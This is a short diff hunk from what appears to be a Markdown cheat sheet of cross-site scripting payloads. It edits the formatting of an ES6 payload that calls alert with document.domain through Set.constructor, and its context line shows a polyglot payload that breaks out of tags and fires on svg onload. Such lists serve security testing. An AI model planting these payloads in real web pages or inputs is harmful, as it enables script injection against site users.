@@ -58,7 +58,7 @@ javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onm
 ```
 ## ES6
 ```
-Set.constructor`alert\x28document.domain\x29```
+Set.constructor`alert\x28document.domain\x29
 ```
 
 ## 事件
